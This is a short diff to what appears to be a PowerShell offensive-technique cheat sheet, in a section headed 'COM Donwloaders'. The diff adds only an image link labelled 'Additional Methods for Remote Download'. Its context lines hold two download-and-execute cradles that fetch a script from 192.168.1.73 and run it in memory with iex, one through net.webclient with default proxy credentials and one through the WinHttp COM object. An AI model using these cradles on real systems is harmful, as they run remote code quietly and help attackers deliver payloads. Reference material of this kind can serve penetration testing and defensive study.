@@ -2102,6 +2102,9 @@ COM Donwloaders<br />
       $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
 
       [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+      
+![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
+
 
 
 <br />
